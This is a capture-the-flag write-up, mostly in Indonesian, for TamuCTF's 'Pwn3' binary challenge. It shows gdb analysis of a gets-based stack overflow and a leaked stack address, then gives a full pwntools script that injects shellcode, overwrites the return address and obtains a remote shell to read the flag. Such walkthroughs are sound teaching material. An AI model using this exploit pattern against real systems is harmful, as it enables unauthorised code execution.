# __TamuCTF__
## _Pwn3_

## Information
**Category:** | **Points**
pwn | 387

**Description**

> nc pwn.tamuctf.com 4323
> Difficulty: easy
> [pwn3](./pwn3)

### Pwn3
#### File
```
pwn1: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd7aa1accb16feac888c99841f504, not stripped
```

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : ENABLED
RELRO     : FULL
```

#### Run
```
[l0l@l0l Pwn3]$ ./pwn3
Take this, you might need it on your journey 0xffb9cfee!
afdasd
```

#### Solve
Langsung coba buka di gdb. Ada beberapa fungsi yang kelihatannya menarik.
```
0x0000059d  echo
0x000005e3  main
```

Di fungsi `main` tidak banyak yang dilakukan, hanya memanggil fungsi `echo` saja. Coba disassemble fungsi `echo`

```
gdb-peda$ pdisass echo
Dump of assembler code for function echo:
   0x0000059d <+0>:     push   ebp
   0x0000059e <+1>:     mov    ebp,esp
   0x000005a0 <+3>:     push   ebx
   0x000005a1 <+4>:     sub    esp,0x134
   0x000005a7 <+10>:    call   0x4a0 <__x86.get_pc_thunk.bx>
   0x000005ac <+15>:    add    ebx,0x1a20
   0x000005b2 <+21>:    sub    esp,0x8
   0x000005b5 <+24>:    lea    eax,[ebp-0x12a]
   0x000005bb <+30>:    push   eax
   0x000005bc <+31>:    lea    eax,[ebx-0x191c]
   0x000005c2 <+37>:    push   eax
   0x000005c3 <+38>:    call   0x410 <printf@plt>
   0x000005c8 <+43>:    add    esp,0x10
   0x000005cb <+46>:    sub    esp,0xc
   0x000005ce <+49>:    lea    eax,[ebp-0x12a]
   0x000005d4 <+55>:    push   eax
   0x000005d5 <+56>:    call   0x420 <gets@plt>
   0x000005da <+61>:    add    esp,0x10
   0x000005dd <+64>:    nop
   0x000005de <+65>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x000005e1 <+68>:    leave
   0x000005e2 <+69>:    ret
End of assembler dump.
```

Buffer Overflow lagi. Kali ini tidak ada proteksi NX maka kita dapat mengeksekusi program di stack.

Lalu pada fungsi echo, program memanggil fungsi `printf` dengan salah satu argumen alamat stack. Hal ini dapat berguna untuk menentukan return address karena program diproteksi PIE.

```
[-------------------------------------code-------------------------------------]
   0x565555bb <echo+30>:        push   eax
   0x565555bc <echo+31>:        lea    eax,[ebx-0x191c]
   0x565555c2 <echo+37>:        push   eax
=> 0x565555c3 <echo+38>:        call   0x56555410 <printf@plt>
   0x565555c8 <echo+43>:        add    esp,0x10
   0x565555cb <echo+46>:        sub    esp,0xc
   0x565555ce <echo+49>:        lea    eax,[ebp-0x12a]
   0x565555d4 <echo+55>:        push   eax
Guessed arguments:
arg[0]: 0x565556b0 ("Take this, you might need it on your journey %p!\n")
arg[1]: 0xffffd4be --> 0x0
[------------------------------------stack-------------------------------------]
0000| 0xffffd4a0 --> 0x565556b0 ("Take this, you might need it on your journey
%p!\n")
0004| 0xffffd4a4 --> 0xffffd4be --> 0x0
0008| 0xffffd4a8 --> 0x0
0012| 0xffffd4ac --> 0x565555ac (<echo+15>:     add    ebx,0x1a20)
0016| 0xffffd4b0 --> 0x0
0020| 0xffffd4b4 --> 0x0
0024| 0xffffd4b8 --> 0x0
0028| 0xffffd4bc --> 0x0
[------------------------------------------------------------------------------]
```

Dan ternyata address yang diberikan adalah address dari input kita.
```
0000| 0xffffd4a0 --> 0xffffd4be ("AAAA")
0004| 0xffffd4a4 --> 0xffffd4be ("AAAA")
```

Jadi kita dapat overflow stack untuk mengoverwrite return address. Lalu mengeksekusi shellcode di stack.

Selanjutnya kita perlu mengetahui berapa padding sebelum return address.

```
   0x565555ce <+49>:    lea    eax,[ebp-0x12a]
   0x565555d4 <+55>:    push   eax
   0x565555d5 <+56>:    call   0x56555420 <gets@plt>
```

Input kita disimpan pada `$ebp-0x12a`, maka susunan payload kita :
`shellcode + padding * (0x12a-len(shell)) + new_ebp + return_address`

#### Payload
```py
from pwn import *
context.arch = 'i386'
r = remote('pwn.tamuctf.com', 4323)

r.recvuntil('0x')
return_address = r.recvuntil('!')[:-1]

payload = asm(shellcraft.sh())
payload += '\x90'*(0x12a-len(payload))
payload += 'XXXX'			# new ebp
payload += p32(int(return_address,16))

r.sendline(payload)
r.interactive()
```

#### Result
```
[l0l@l0l Pwn3]$ ./solve.py
[+] Opening connection to pwn.tamuctf.com on port 4323: Done
[*] Switching to interactive mode

$ ls
flag.txt
pwn3
$ cat flag.txt
gigem{r3m073_fl46_3x3cu710n}
```

#### Flag
gigem{r3m073_fl46_3x3cu710n}
